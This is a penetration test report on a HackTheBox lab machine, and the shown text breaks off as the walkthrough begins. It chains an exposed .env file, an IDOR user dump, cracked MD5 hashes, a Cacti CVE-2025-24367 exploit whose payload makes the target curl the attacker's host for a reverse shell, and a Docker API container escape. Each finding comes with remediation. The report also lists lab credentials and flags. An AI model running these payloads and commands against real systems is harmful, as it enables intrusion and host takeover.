# PENETRATION TESTING REPORT

## MonitorsFour – HackTheBox Lab Environment – External Network Penetration Test

## DATE_OF_TEST_EVENT

**Testing Period:** January 15, 2026 (UTC-5 / EST)

---

## TABLE_OF_CONTENTS

1. [Document Revision History](#document-revision-history)
2. [Statement of Confidentiality](#statement-of-confidentiality)
3. [Engagement Contacts](#engagement-contacts)
4. [Executive Summary](#executive-summary)
5. [Network Penetration Test Assessment Summary](#network-penetration-test-assessment-summary)
6. [Findings](#findings)
   - [PT-001: Sensitive Environment Configuration File Exposure](#finding-id-pt-001)
   - [PT-002: Insecure Direct Object Reference (IDOR) in User API Endpoint](#finding-id-pt-002)
   - [PT-003: Weak Password Hashing (MD5) and Crackable Credentials](#finding-id-pt-003)
   - [PT-004: CVE-2025-24367 – Cacti Authenticated Graph Template RCE](#finding-id-pt-004)
   - [PT-005: Exposed Docker API Leading to Container Escape and Host Compromise](#finding-id-pt-005)
   - [PT-006: Missing Security Headers](#finding-id-pt-006)
   - [PT-007: Session Cookie Without HttpOnly Flag](#finding-id-pt-007)
7. [Internal Network Compromise Walkthrough](#internal-network-compromise-walkthrough)
8. [Remediation Summary](#remediation-summary)
9. [Appendices](#appendices)

---

## Document Revision History

| Author         | Date           | Version | Comment                                        |
| -------------- | -------------- | ------- | ---------------------------------------------- |
| Security Team  | 2026-01-15     | 1.0     | Initial draft – generated from engagement logs |

---

## STATEMENT OF CONFIDENTIALITY

This document contains sensitive security information, including system architecture details, vulnerabilities, and exploitation techniques. Distribution is restricted to authorized personnel only.

**Classification:** CONFIDENTIAL  
**Handling:** Do not distribute outside authorized personnel.

---

## ENGAGEMENT CONTACTS

| Contact        | Title                  | Phone        | Email                        |
| -------------- | ---------------------- | ------------ | ---------------------------- |
| N/A            | Penetration Tester     | N/A          | N/A                          |
| Marcus Higgins | System Administrator   | N/A          | admin@monitorsfour.htb       |

*[Source: Extracted from API response – curl.log]*

---

## EXECUTIVE SUMMARY

### Overview

*[Source: Expert Analysis based on log files]*

This penetration testing engagement was conducted against the MonitorsFour environment (10.129.63.172 / monitorsfour.htb) as part of a HackTheBox lab exercise. The assessment evaluated the security posture of the in-scope environment against real-world attack scenarios, focusing on identifying vulnerabilities that could lead to unauthorized access, data exposure, service disruption, or privilege escalation.

### Key Findings Summary

The assessment identified **seven (7)** distinct findings ranging from **Informational** to **Critical** severity:

| Severity      | Count | Description                                                    |
| ------------- | ----- | -------------------------------------------------------------- |
| Critical      | 2     | Authenticated RCE in Cacti, Exposed Docker API                 |
| High          | 2     | Environment file exposure, IDOR with credential disclosure     |
| Medium        | 1     | Weak password hashing (MD5)                                    |
| Low           | 1     | Session cookie missing HttpOnly flag                           |
| Informational | 1     | Missing security headers                                       |

**Overall Risk Assessment:** The target environment was **fully compromised**. Both user-level and root-level access were obtained through a chain of vulnerabilities.

### Attack Chain Summary

1. **Initial Access:** Exposed `.env` file revealed database credentials; IDOR vulnerability exposed user credentials including MD5 password hashes
2. **Credential Cracking:** MD5 hash cracked using hashcat, revealing plaintext password
3. **Exploitation:** CVE-2025-24367 (Cacti Authenticated RCE) exploited to obtain reverse shell as `www-data`
4. **Privilege Escalation:** Docker container escape via exposed Docker API on internal network

### SCENARIOS INCLUDED

* *External Network Penetration Test* – Assessment of externally exposed systems and services from an unauthenticated attacker perspective.
* *Web Application Testing* – Evaluation of web application security controls and API endpoints.
* *Credentialed Testing* – Post-authentication exploitation using discovered credentials.
* *Container Security Assessment* – Analysis of Docker container escape vectors.

*[Source: Expert Analysis / Industry Best Practice]*

### APPROACH

*[Source: Industry Best Practice]*

The assessment followed an industry-recognized penetration testing methodology combining automated tooling with manual validation and exploitation:

1. **Reconnaissance & Enumeration:** Nmap, Gobuster, Nikto, WhatWeb, FFUF, AutoRecon
2. **Vulnerability Identification:** Manual analysis, CVE research
3. **Exploitation:** Custom exploit script (CVE-2025-24367), credential cracking (Hashcat)
4. **Post-Exploitation:** Container enumeration, Docker API discovery, container escape

All findings were manually verified. Exploitation activities were carefully controlled.

### SCOPE AND DURATION

| Host/IP/URL              | Duration                          | Description                            |
| ------------------------ | --------------------------------- | -------------------------------------- |
| 10.129.63.172            | 2026-01-15 16:25 – 18:30 EST      | Primary target                         |
| monitorsfour.htb         | (Virtual Host)                    | Main web application                   |
| cacti.monitorsfour.htb   | (Virtual Host)                    | Cacti network monitoring application   |

*[Source: nmap_init.nmap, gobuster.log]*

### ASSESSMENT OVERVIEW AND RECOMMENDATIONS

*[Source: Expert Analysis / Industry Best Practice]*

The assessment revealed several critical security weaknesses:

1. **Sensitive Data Exposure:** Environment files and API endpoints leaked credentials
2. **Weak Cryptography:** MD5 password hashing allows rapid credential recovery
3. **Unpatched Software:** Cacti installation vulnerable to CVE-2025-24367
4. **Container Security:** Exposed Docker API allowed complete host compromise
5. **Missing Security Controls:** Absent security headers and insecure cookie configurations

**Priority Recommendations:**

1. **Immediate:** Patch Cacti to latest version; restrict Docker API access
2. **Short-term:** Implement proper access controls on .env files and API endpoints; upgrade password hashing to bcrypt/Argon2
3. **Long-term:** Implement network segmentation for container environments; deploy WAF and security header policies

---

## NETWORK PENETRATION TEST ASSESSMENT SUMMARY

*[Source: nmap_init.nmap, _full_tcp_nmap.txt, netexec.log]*

### Target Environment Overview

| Host            | IP Address     | Operating System                      | Role                  |
| --------------- | -------------- | ------------------------------------- | --------------------- |
| MONITORSFOUR    | 10.129.63.172  | Windows 11 / Server 2025 Build 26100  | Web/Application Server|

### Open Ports and Services

| Port      | State | Service   | Version                              |
| --------- | ----- | --------- | ------------------------------------ |
| 80/tcp    | open  | http      | nginx (PHP/8.3.27)                   |
| 5985/tcp  | open  | http      | Microsoft HTTPAPI httpd 2.0 (WinRM)  |

*[Source: nmap_init.nmap, _full_tcp_nmap.txt]*

### Virtual Hosts Discovered

| Virtual Host              | Status | Application               |
| ------------------------- | ------ | ------------------------- |
| monitorsfour.htb          | 200    | Main web application      |
| cacti.monitorsfour.htb    | 302    | Cacti monitoring (→/cacti)|

*[Source: gobuster.log]*

### SUMMARY OF FINDINGS

*[Source: Expert Analysis based on all scan logs]*

* Sensitive configuration files exposed to unauthenticated users
* API endpoints disclosed user credentials without proper authorization
* Password hashes used weak MD5 algorithm and were easily cracked
* Cacti application vulnerable to authenticated remote code execution
* Docker API accessible from container network without authentication
* Security headers missing from HTTP responses
* Session cookies configured without HttpOnly protection

---

## FINDING ID: PT-001

**Finding Title:** Sensitive Environment Configuration File Exposure (.env)

**Severity:** High  
**Risk Rating:** CVSS v3.1: 7.5 (High)  
**Mapped Controls:**
- NIST 800-53: SC-28 (Protection of Information at Rest), AC-3 (Access Enforcement)
- CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
- CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory

**Impact:** Exposure of database credentials enabling potential data breach or further system compromise.

---

### SUMMARY

*[Source: ffuf.log, curl.log – Finding from Executed Logs]*

The web application exposes its environment configuration file (`.env`) to unauthenticated users. This file contains sensitive database connection credentials including hostname, port, database name, username, and password.

---

### AFFECTED ASSETS

| Asset              | IP / Hostname          | Role               | Environment |
| ------------------ | ---------------------- | ------------------ | ----------- |
| Main Web App       | monitorsfour.htb       | Web Application    | Production  |

---

### VULNERABILITY TYPE

* Category: Information Disclosure, Misconfiguration
* Associated weakness class: CWE-200, CWE-538

---

### DESCRIPTION

*[Source: curl.log, ffuf.log – Executed Logs]*

The FFUF directory enumeration scan identified that the `/.env` endpoint returns HTTP 200 with 97 bytes of content. Subsequent curl requests confirmed the file contains database credentials:

- **DB_HOST:** mariadb
- **DB_PORT:** 3306
- **DB_NAME:** monitorsfour_db
- **DB_USER:** monitorsdbuser
- **DB_PASS:** f37p2j8f4t0r

The `.env` file is a common configuration file used in PHP and Node.js applications to store environment variables. These files should never be accessible via the web server.

---

### ATTACK VECTOR

*[Source: Expert Analysis]*

- **Network access requirements:** Remote, no VPN required
- **Authentication requirements:** None (unauthenticated access)
- **User interaction:** None required

---

### PROOF OF CONCEPT / EVIDENCE

*[Source: ffuf.log – Executed Log]*

```text
┌──(kali㉿kali)-[/mnt/htba/cases/htb/MonitorsFour]
└─ [2026-01-15 17:54:17] $ ffuf -u http://monitorsfour.htb/FUZZ ...
...
.env                    [Status: 200, Size: 97, Words: 1, Lines: 6, Duration: 59ms]
```

*[Source: curl.log – Executed Log]*

```text
DB_HOST=mariadb
DB_PORT=3306
DB_NAME=monitorsfour_db
DB_USER=monitorsdbuser
DB_PASS=f37p2j8f4t0r
```

---

### EXPLOITATION DETAILS

*[Source: Expert Analysis based on curl.log]*

Exploitation was trivial:
1. Directory enumeration discovered `.env` endpoint
2. Direct HTTP GET request retrieved credentials
3. No authentication or authorization bypass required

---

### IMPACT

*[Source: Expert Analysis]*

* **Data exposure risk:** High – database credentials exposed
* **Privilege escalation potential:** Medium – credentials may be reused
* **Lateral movement capability:** Medium – database access may expose additional credentials
* **Service availability concerns:** High – attacker could modify/delete database

---

### LIKELIHOOD

*[Source: Expert Analysis / Industry Best Practice]*

**High** – The file is directly accessible without authentication. Automated scanners routinely check for this file.

---

### RISK JUSTIFICATION

*[Source: Expert Analysis]*

High severity is appropriate because:
- Direct, unauthenticated access to credentials
- Credentials provide database access
- Common attack vector with high automation potential

---

### RECOMMENDATIONS

*[Source: Industry Best Practice]*

**Immediate:**
- Block access to `.env` files in nginx configuration:
  ```nginx
  location ~ /\.env {
      deny all;
      return 404;
  }
  ```
- Rotate exposed database credentials immediately

**Long-term:**
- Store sensitive configuration outside web root
- Use environment variables loaded at runtime
- Implement file integrity monitoring

---

### VALIDATION / VERIFICATION STEPS

*[Source: Expert Generated]*

1. Attempt to access `http://monitorsfour.htb/.env`
2. Verify HTTP 403/404 response is returned
3. Confirm database credentials have been rotated

---

### REFERENCES

* CWE-200: https://cwe.mitre.org/data/definitions/200.html
* CWE-538: https://cwe.mitre.org/data/definitions/538.html
* OWASP: https://owasp.org/Top10/A01_2021-Broken_Access_Control/

---

### STATUS

Open

---

### NOTES

*[Source: Expert Analysis]*

The database hostname "mariadb" suggests the application uses containerized infrastructure (likely Docker Compose with service names).

---

### RELATED FINDINGS

- PT-002 (IDOR exposing additional credentials)
- PT-003 (Weak password hashing)

---

## FINDING ID: PT-002

**Finding Title:** Insecure Direct Object Reference (IDOR) in User API Endpoint

**Severity:** High  
**Risk Rating:** CVSS v3.1: 7.5 (High)  
**Mapped Controls:**
- NIST 800-53: AC-3 (Access Enforcement), AC-4 (Information Flow Enforcement)
- CWE-639: Authorization Bypass Through User-Controlled Key

**Impact:** Complete disclosure of user accounts including password hashes, personal information, and salary data.

---

### SUMMARY

*[Source: dirb.log, curl.log – Executed Logs]*

The `/api/v1/user` endpoint accepts a `token` parameter that allows unauthenticated enumeration of all user accounts. Supplying `token=0` returns a JSON array containing complete user records including MD5 password hashes.

---

### AFFECTED ASSETS

| Asset              | IP / Hostname          | Role               | Environment |
| ------------------ | ---------------------- | ------------------ | ----------- |
| Main Web App API   | monitorsfour.htb       | REST API           | Production  |

---

### VULNERABILITY TYPE

* Category: Authorization, Broken Access Control
* Associated weakness class: CWE-639: Authorization Bypass Through User-Controlled Key

---

### DESCRIPTION

*[Source: dirb.log, curl.log – Executed Logs]*

The directory brute-force scan using DIRB identified the `/user` endpoint returning a JSON response. Testing revealed that appending `?token=0` bypasses authorization checks and returns all user records.

Exposed data includes:
- User IDs, usernames, email addresses
- MD5 password hashes
- Role assignments (super user, user)
- Personal identifiable information (name, DOB, start date)
- Salary information

---

### ATTACK VECTOR

*[Source: Expert Analysis]*

- **Network access requirements:** Remote access
- **Authentication requirements:** None
- **User interaction:** None required

---

### PROOF OF CONCEPT / EVIDENCE

*[Source: curl.log – Executed Log]*

```json
[
{"id":2,"username":"admin","email":"admin@monitorsfour.htb","password":"56b32eb43e6f15395f6c46c1c9e1cd36","role":"super user","token":"8024b78f83f102da4f","name":"Marcus Higgins","position":"System Administrator","dob":"1978-04-26","start_date":"2021-01-12","salary":"320800.00"},
{"id":5,"username":"mwatson","email":"mwatson@monitorsfour.htb","password":"69196959c16b26ef00b77d82cf6eb169","role":"user","token":"0e543210987654321","name":"Michael Watson","position":"Website Administrator","dob":"1985-02-15","start_date":"2021-05-11","salary":"75000.00"},
{"id":6,"username":"janderson","email":"janderson@monitorsfour.htb","password":"2a22dcf99190c322d974c8df5ba3256b","role":"user","token":"0e999999999999999","name":"Jennifer Anderson","position":"Network Engineer","dob":"1990-07-16","start_date":"2021-06-20","salary":"68000.00"},
{"id":7,"username":"dthompson","email":"dthompson@monitorsfour.htb","password":"8d4a7e7fd08555133e056d9aacb1e519","role":"user","token":"0e111111111111111","name":"David Thompson","position":"Database Manager","dob":"1982-11-23","start_date":"2022-09-15","salary":"83000.00"}
]
```

---

### EXPLOITATION DETAILS

*[Source: Expert Analysis based on curl.log]*

1. DIRB discovered `/user` endpoint returning JSON
2. Testing with `?token=0` bypassed authorization
3. All user records returned including sensitive data
4. Password hashes extracted for offline cracking

---

### IMPACT

*[Source: Expert Analysis]*

* **Data exposure risk:** Critical – complete user database exposed
* **Privilege escalation potential:** High – password hashes can be cracked
* **Lateral movement capability:** High – credentials may be reused across systems
* **Regulatory impact:** PII and salary data exposure (GDPR, privacy violations)

---

### LIKELIHOOD

*[Source: Expert Analysis]*

**High** – Simple parameter manipulation; easily discovered through automated testing.

---

### RISK JUSTIFICATION

*[Source: Expert Analysis]*

High severity due to complete credential exposure enabling account takeover and the sensitivity of exposed PII/salary data.

---

### RECOMMENDATIONS

*[Source: Industry Best Practice]*

**Immediate:**
- Implement proper authorization checks on all API endpoints
- Require valid session token for data access
- Return only data relevant to authenticated user

**Long-term:**
- Implement API rate limiting
- Add logging/alerting for bulk data access
- Consider API gateway with authorization enforcement

---

### VALIDATION / VERIFICATION STEPS

*[Source: Expert Generated]*

1. Attempt to access `/api/v1/user?token=0` unauthenticated
2. Verify HTTP 401/403 response is returned
3. Verify authenticated users only see their own data

---

### REFERENCES

* CWE-639: https://cwe.mitre.org/data/definitions/639.html
* OWASP API Security Top 10: https://owasp.org/www-project-api-security/

---

### STATUS

Open

---

### RELATED FINDINGS

- PT-001 (.env exposure)
- PT-003 (Weak password hashing enabling hash cracking)

---

## FINDING ID: PT-003

**Finding Title:** Weak Password Hashing (MD5) and Crackable Credentials

**Severity:** Medium  
**Risk Rating:** CVSS v3.1: 5.9 (Medium)  
**Mapped Controls:**
- NIST 800-53: IA-5 (Authenticator Management), SC-13 (Cryptographic Protection)
- CWE-328: Use of Weak Hash

**Impact:** Password hashes easily reversed to plaintext, enabling account takeover.

---

### SUMMARY

*[Source: hashcat.log, logs/hashes.txt – Executed Logs]*

User passwords are stored using unsalted MD5 hashing. MD5 is cryptographically broken and unsuitable for password storage. The administrator password hash was cracked in under 23 seconds using hashcat with the rockyou wordlist.

---

### AFFECTED ASSETS

| Asset              | IP / Hostname          | Role               | Environment |
| ------------------ | ---------------------- | ------------------ | ----------- |
| User Database      | monitorsfour.htb       | Authentication     | Production  |

---

### VULNERABILITY TYPE

* Category: Cryptography, Authentication
* Associated weakness class: CWE-328: Use of Weak Hash

---

### DESCRIPTION

*[Source: hashcat.log – Executed Log]*

Password hashes extracted from the API endpoint were identified as unsalted MD5 (hashcat mode 0). The hash `56b32eb43e6f15395f6c46c1c9e1cd36` was cracked to reveal plaintext password `wonderful1`.

MD5 weaknesses:
- No salt protection against rainbow table attacks
- Fast computation allows billions of guesses per second
- Cryptographically broken – collision vulnerabilities

---

### ATTACK VECTOR

*[Source: Expert Analysis]*

- **Prerequisites:** Access to password hashes (obtained via PT-002)
- **Attack complexity:** Low – standard wordlist attack
- **Time to crack:** 23 seconds for administrator password

---

### PROOF OF CONCEPT / EVIDENCE

*[Source: hashcat.log – Executed Log]*

```text
┌──(kali㉿kali)-[/mnt/htba/cases/htb/MonitorsFour]
└─ [2026-01-15 18:20:49] $ hashcat -a 0 -m 0 ./logs/hashes.txt /usr/share/wordlists/rockyou.txt 
...
56b32eb43e6f15395f6c46c1c9e1cd36:wonderful1               
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 56b32eb43e6f15395f6c46c1c9e1cd36
Time.Started.....: Thu Jan 15 18:21:30 2026 (0 secs)
Time.Estimated...: Thu Jan 15 18:21:30 2026 (0 secs)
Speed.#01........:  2069.5 kH/s (0.38ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
...
Started: Thu Jan 15 18:21:08 2026
Stopped: Thu Jan 15 18:21:31 2026
```

---

### EXPLOITATION DETAILS

*[Source: tasks.md, Expert Analysis]*

1. Extracted hash from PT-002 IDOR vulnerability
2. Identified as MD5 (32-character hexadecimal)
3. Ran hashcat with rockyou wordlist
4. Cracked in 23 seconds: `wonderful1`
5. Tested credentials:
   - `admin` / `wonderful1` – **Failed** (different application context)
   - `marcus` / `wonderful1` – **Success** on Cacti (cacti.monitorsfour.htb)

---

### IMPACT

*[Source: Expert Analysis]*

* **Account compromise:** Administrator account accessible
* **Privilege escalation:** Super user role obtained
* **Data exposure:** Full application access achieved
* **Further exploitation:** Credentials enabled CVE-2025-24367 exploitation

---

### LIKELIHOOD

*[Source: Expert Analysis]*

**High** – Given hash exposure (PT-002), cracking MD5 is trivial with commodity hardware.

---

### RISK JUSTIFICATION

*[Source: Expert Analysis]*

Medium severity assigned because exploitation requires prior access to hashes (dependency on PT-002). Combined impact is High.

---

### RECOMMENDATIONS

*[Source: Industry Best Practice]*

**Immediate:**
- Force password reset for all affected accounts
- Implement account lockout monitoring

**Long-term:**
- Migrate to bcrypt, scrypt, or Argon2id with proper work factors
- Implement password complexity requirements
- Add breach detection (Have I Been Pwned integration)

---

### VALIDATION / VERIFICATION STEPS

*[Source: Expert Generated]*

1. Extract password hash from new user account
2. Verify hash format indicates bcrypt/Argon2 (not MD5)
3. Attempt hashcat attack – verify resistance

---

### REFERENCES

* CWE-328: https://cwe.mitre.org/data/definitions/328.html
* OWASP Password Storage: https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html

---

### STATUS

Open

---

### RELATED FINDINGS

- PT-002 (IDOR enabling hash extraction)
- PT-004 (Credentials used for authenticated RCE)

---

## FINDING ID: PT-004

**Finding Title:** CVE-2025-24367 – Cacti Authenticated Graph Template Remote Code Execution

**Severity:** Critical  
**Risk Rating:** CVSS v3.1: 8.8 (High)  
**Mapped Controls:**
- NIST 800-53: SI-2 (Flaw Remediation), CM-6 (Configuration Settings)
- CWE-94: Improper Control of Generation of Code ('Code Injection')

**Impact:** Remote code execution on web server, leading to complete application server compromise.

---

### SUMMARY

*[Source: scripts/exploit.py, reverse_sh.log – Executed Logs]*

The Cacti network monitoring application (cacti.monitorsfour.htb) is vulnerable to CVE-2025-24367, an authenticated remote code execution vulnerability in the Graph Template functionality. Exploitation yielded a reverse shell as `www-data` user.

---

### AFFECTED ASSETS

| Asset              | IP / Hostname              | Role               | Environment |
| ------------------ | -------------------------- | ------------------ | ----------- |
| Cacti Application  | cacti.monitorsfour.htb     | Network Monitoring | Production  |

---

### VULNERABILITY TYPE

* Category: Remote Code Execution, Input Validation
* Associated weakness class: CWE-94: Code Injection

---

### DESCRIPTION

*[Source: scripts/exploit.py – Executed Log]*

CVE-2025-24367 exists in Cacti's graph template functionality. An authenticated user can inject arbitrary shell commands through the `right_axis_label` parameter when editing graph templates. The injected commands are executed when the graph is rendered via RRDtool.

The exploit leverages:
1. Graph template edit functionality
2. RRDtool command injection through label parameter
3. PHP file creation and execution for payload delivery

---

### ATTACK VECTOR

*[Source: scripts/exploit.py header – Executed Log]*

```text
###########################################################
#                                                         #
# CVE-2025-24367 - Cacti Authenticated Graph Template RCE #
#         Created by TheCyberGeek @ HackTheBox            #
#             For educational purposes only               #    
#                                                         #
###########################################################
```

- **Network access requirements:** Remote access to Cacti application
- **Authentication requirements:** Valid Cacti user credentials (obtained via PT-003)
- **User interaction:** None after initial authentication

---

### PROOF OF CONCEPT / EVIDENCE

*[Source: scripts/exploit.py – Executed Log]*

**Exploit Execution Flow:**
1. Login with credentials (`marcus` / `wonderful1`)
2. Retrieve CSRF token
3. Locate "Unix - Logged in Users" graph template
4. Inject payload into `right_axis_label`:

```python
right_axis_label = (
    f"XXX\n"
    f"create my.rrd --step 300 DS:temp:GAUGE:600:-273:5000 "
    f"RRA:AVERAGE:0.5:1:1200\n"
    f"graph {get_payload_filename} -s now -a CSV "
    f"DEF:out=my.rrd:temp:AVERAGE LINE1:out:<?=`curl\\x20{ip}/bash\\x20-o\\x20bash`;?>\n"
)
```

5. Trigger graph rendering to execute payload
6. Second stage executes bash reverse shell

*[Source: reverse_sh.log – Executed Log]*

```text
www-data@821fbd6a43fa:~/html/cacti$ pwd
/var/www/html/cacti
www-data@821fbd6a43fa:/home$ ls
marcus
www-data@821fbd6a43fa:/home/marcus$ cat user.txt
user flag: a3c1cc58144071a720ebeab984da076b
```

---

### EXPLOITATION DETAILS

*[Source: reverse_sh.log, scripts/exploit.py – Executed Logs]*

**Steps taken:**
1. Started netcat listener on attacker machine (port 4444)
2. Executed exploit script with discovered credentials
3. Exploit created malicious PHP files on target
4. Triggered execution via graph render endpoint
5. Received reverse shell as `www-data`

**Access obtained:**
- Shell access as `www-data` user
- Container ID: `821fbd6a43fa` (Docker container)
- User flag captured: `a3c1cc58144071a720ebeab984da076b`

---

### IMPACT

*[Source: Expert Analysis]*

* **Remote code execution:** Complete
* **Privilege level:** Web server user (www-data)
* **Data exposure:** Access to application files, configuration, source code
* **Lateral movement:** Container network access enabled PT-005

---

### LIKELIHOOD

*[Source: Expert Analysis]*

**High** – Public exploit available; requires only authenticated access (credentials easily obtained via PT-001/PT-002/PT-003 chain).

---

### RISK JUSTIFICATION

*[Source: Expert Analysis]*

Critical severity due to:
- Remote code execution capability
- Public exploit availability
- Low complexity exploitation
- Direct path to system compromise

---

### RECOMMENDATIONS

*[Source: Industry Best Practice]*

**Immediate:**
- Patch Cacti to latest version addressing CVE-2025-24367
- Restrict Cacti access to authorized administrators only
- Implement network segmentation for monitoring systems

**Long-term:**
- Implement Web Application Firewall (WAF)
- Enable security monitoring and alerting
- Regular vulnerability scanning schedule

---

### VALIDATION / VERIFICATION STEPS

*[Source: Expert Generated]*

1. Verify Cacti version is patched
2. Attempt to modify graph template with malicious payload
3. Verify input sanitization prevents code injection

---

### REFERENCES

* CVE-2025-24367
* Exploit Source: TheCyberGeek @ HackTheBox
* CWE-94: https://cwe.mitre.org/data/definitions/94.html

---

### STATUS

Open

---

### RELATED FINDINGS

- PT-003 (Credentials enabling exploitation)
- PT-005 (Post-exploitation privilege escalation)

---

## FINDING ID: PT-005

**Finding Title:** Exposed Docker API Leading to Container Escape and Host Compromise

**Severity:** Critical  
**Risk Rating:** CVSS v3.1: 9.8 (Critical)  
**Mapped Controls:**
- NIST 800-53: AC-3 (Access Enforcement), SC-7 (Boundary Protection)
- CWE-306: Missing Authentication for Critical Function

**Impact:** Complete host system compromise through container escape; root-level access obtained.

---

### SUMMARY

*[Source: reverse_sh.log – Executed Log]*

From the compromised container (PT-004), network scanning revealed an exposed Docker API on the internal network (192.168.65.7:2375). The API lacked authentication, allowing creation of a malicious container with host filesystem access, leading to complete host compromise.

---

### AFFECTED ASSETS

| Asset              | IP / Hostname              | Role               | Environment |
| ------------------ | -------------------------- | ------------------ | ----------- |
| Docker Host        | 192.168.65.7               | Container Manager  | Production  |

---

### VULNERABILITY TYPE

* Category: Authentication, Container Security
* Associated weakness class: CWE-306: Missing Authentication for Critical Function

---

### DESCRIPTION

*[Source: reverse_sh.log – Executed Log]*

The Docker daemon API (port 2375) was exposed on the internal container network without authentication. This is a critical misconfiguration as the Docker API provides full control over the container runtime, including:
- Container creation/deletion
- Volume mounting
- Command execution
- Network configuration

An attacker with container access can mount the host filesystem and achieve full root access to the underlying host.

---

### ATTACK VECTOR

*[Source: reverse_sh.log – Executed Log]*

- **Network access requirements:** Internal container network (post-exploitation)
- **Authentication requirements:** None (API unauthenticated)
- **User interaction:** None required

---

### PROOF OF CONCEPT / EVIDENCE

*[Source: reverse_sh.log – Executed Log]*

**Discovery:**
```bash
for i in $(seq 1 254); do (curl -s --connect-timeout 1 http://192.168.65.$i:2375/version 2>/dev/null | grep -q "ApiVersion" && echo "192.168.65.$i:2375 OPEN") & done; wait
```

**Malicious Container Configuration:**
```json
{
  "Image": "alpine:latest",
  "Cmd": ["/bin/sh", "-c", "cat /mnt/host_root/Users/Administrator/Desktop/root.txt"],
  "HostConfig": {
    "Binds": ["/mnt/host/c:/mnt/host_root"]
  },
  "Tty": true,
  "OpenStdin": true
}
```

**Exploitation:**
```bash
# Create malicious container
curl -X POST -H "Content-Type: application/json" -d @/tmp/container.json http://192.168.65.7:2375/containers/create?name=pwned
{"Id":"7d99df11ee0f9d29c093acb26f741bebda84e7d02c90097590c0791241075468","Warnings":[]}

# Start container
curl -X POST http://192.168.65.7:2375/containers/8216a1ffa0f10e85f782da81513686de8fa1a224367ee1028d844753853df429/start

# Retrieve root flag from host filesystem
curl http://192.168.65.7:2375/containers/8216a1ffa0f10e85f782da81513686de8fa1a224367ee1028d844753853df429/logs?stdout=true
root flag: 872a2609a68c5c225af20026cd0c8f70
```

---

### EXPLOITATION DETAILS

*[Source: reverse_sh.log – Executed Log]*

1. From compromised Cacti container, scanned internal network
2. Discovered Docker API on 192.168.65.7:2375
3. Created container configuration mounting host filesystem
4. Deployed malicious container via API
5. Executed command to read Administrator's root.txt
6. **Root flag captured:** `872a2609a68c5c225af20026cd0c8f70`

---

### IMPACT

*[Source: Expert Analysis]*

* **Complete host compromise:** Root/Administrator access achieved
* **Data exposure:** Full access to host filesystem
* **Persistence:** Attacker could install backdoors on host
* **Lateral movement:** Host access enables further network pivoting

---

### LIKELIHOOD

*[Source: Expert Analysis]*

**High** – Post container compromise, exploitation is trivial and well-documented.

---

### RISK JUSTIFICATION

*[Source: Expert Analysis]*

Critical severity due to:
- Complete host compromise achieved
- No authentication on critical management interface
- Well-known attack vector
- Industry-recognized best practice violation

---

### RECOMMENDATIONS

*[Source: Industry Best Practice]*

**Immediate:**
- Disable unauthenticated Docker API access
- Bind Docker API to localhost only or use Unix socket
- Implement network segmentation between containers and management interfaces

**Long-term:**
- Enable Docker TLS authentication
- Implement container security scanning
- Deploy container runtime security (Falco, Sysdig)
- Use read-only containers where possible
- Apply principle of least privilege to container mounts

---

### VALIDATION / VERIFICATION STEPS

*[Source: Expert Generated]*

1. Attempt to access Docker API from container network
2. Verify connection refused or authentication required
3. Confirm containers cannot mount arbitrary host paths

---

### REFERENCES

* CWE-306: https://cwe.mitre.org/data/definitions/306.html
* Docker Security: https://docs.docker.com/engine/security/
* OWASP Container Security: https://owasp.org/www-project-container-security/

---

### STATUS

Open

---

### RELATED FINDINGS

- PT-004 (Initial access via Cacti RCE)

---

## FINDING ID: PT-006

**Finding Title:** Missing Security Headers

**Severity:** Informational  
**Risk Rating:** CVSS v3.1: 0.0 (Informational)  
**Mapped Controls:**
- NIST 800-53: SC-8 (Transmission Confidentiality and Integrity)
- CWE-693: Protection Mechanism Failure

**Impact:** Increased susceptibility to client-side attacks.

---

### SUMMARY

*[Source: nikto.log – Executed Log]*

Multiple security headers are missing from HTTP responses, reducing defense-in-depth against common web attacks including clickjacking and content-type sniffing.

---

### AFFECTED ASSETS

| Asset              | IP / Hostname          | Role               | Environment |
| ------------------ | ---------------------- | ------------------ | ----------- |
| Main Web App       | monitorsfour.htb       | Web Application    | Production  |

---

### DESCRIPTION

*[Source: nikto.log – Executed Log]*

Nikto identified the following missing headers:
- **X-Frame-Options:** Prevents clickjacking attacks
- **X-Content-Type-Options:** Prevents MIME-type sniffing

---

### PROOF OF CONCEPT / EVIDENCE

*[Source: nikto.log – Executed Log]*

```text
+ /: The anti-clickjacking X-Frame-Options header is not present.
+ /: The X-Content-Type-Options header is not set.
```

---

### RECOMMENDATIONS

*[Source: Industry Best Practice]*

Add the following headers to nginx configuration:

```nginx
add_header X-Frame-Options "DENY" always;
add_header X-Content-Type-Options "nosniff" always;
add_header X-XSS-Protection "1; mode=block" always;
add_header Content-Security-Policy "default-src 'self'" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
```

---

### STATUS

Open

---

## FINDING ID: PT-007

**Finding Title:** Session Cookie Without HttpOnly Flag

**Severity:** Low  
**Risk Rating:** CVSS v3.1: 3.1 (Low)  
**Mapped Controls:**
- NIST 800-53: SC-23 (Session Authenticity)
- CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag

**Impact:** Session tokens vulnerable to theft via XSS attacks.

---

### SUMMARY

*[Source: nikto.log – Executed Log]*

The `PHPSESSID` session cookie is set without the HttpOnly flag, making it accessible to client-side JavaScript. If combined with an XSS vulnerability, this could enable session hijacking.

---

### AFFECTED ASSETS

| Asset              | IP / Hostname          | Role               | Environment |
| ------------------ | ---------------------- | ------------------ | ----------- |
| Main Web App       | monitorsfour.htb       | Web Application    | Production  |

---

### PROOF OF CONCEPT / EVIDENCE

*[Source: nikto.log – Executed Log]*

```text
+ /: Cookie PHPSESSID created without the httponly flag.
```

---

### RECOMMENDATIONS

*[Source: Industry Best Practice]*

Configure PHP session settings in `php.ini`:

```ini
session.cookie_httponly = 1
session.cookie_secure = 1
session.cookie_samesite = Strict
```

---

### STATUS

Open

---

## INTERNAL NETWORK COMPROMISE WALKTHROUGH

*[Source: All log files – Executed Logs; Expert Analysis]*

### DETAILED WALKTHROUGH

This section documents the complete attack path demonstrating how an attacker progressed from initial reconnaissance to full host compromise.

---

#### Phase 1: Reconnaissance and Enumeration

**1.1 Initial Port Scan**  
*[Source: nmap_init.nmap]*

```text
